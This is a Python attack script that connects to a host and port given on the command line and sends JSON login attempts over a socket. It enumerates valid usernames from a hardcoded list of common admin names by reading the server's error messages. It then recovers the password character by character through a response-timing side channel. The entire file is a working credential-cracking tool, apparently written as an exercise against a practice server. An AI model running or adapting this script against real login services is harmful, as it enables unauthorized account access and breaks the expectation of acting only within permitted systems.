import argparse
import socket
from json import dumps, loads
import time
parser = argparse.ArgumentParser()
parser.add_argument('host', help='enter hostname')
parser.add_argument('port', help='enter port number', type=int)
args = parser.parse_args()

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
logins_list = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
    'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator',
    'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser',
    'superadmin', 'username', 'username1'
]
my_socket = socket.socket()
my_socket.connect((args.host, args.port))


def login_with(log, pas):
    message = {"login": log,
               "password": pas}
    message = dumps(message).encode()
    try:
        my_socket.send(message)
        response = my_socket.recv(1024)
        response = response.decode()
        response = loads(response)
        return response["result"]
    except ConnectionAbortedError:
        return "ConnectionAborted"


ans = {"login": "", "password": ""}
for user in logins_list:
    result = login_with(user, "\0", )
    if result == "Wrong password!":
        ans["login"] = user
        break
password = []
checker = ""
resp = ""
while resp != "Connection success!":
    letter = {}
    for p in abc:
        checker = "".join(password) + p
        start = time.time()
        resp = login_with(ans["login"], checker)
        end = time.time()
        letter[p] = end - start
        if resp == "Connection success!":
            password.append(p)
            ans["password"] = "".join(password)
            break
    password.append(sorted(letter.items(), key=lambda x: x[1], reverse=True)[0][0])
print(dumps(ans, indent=4))
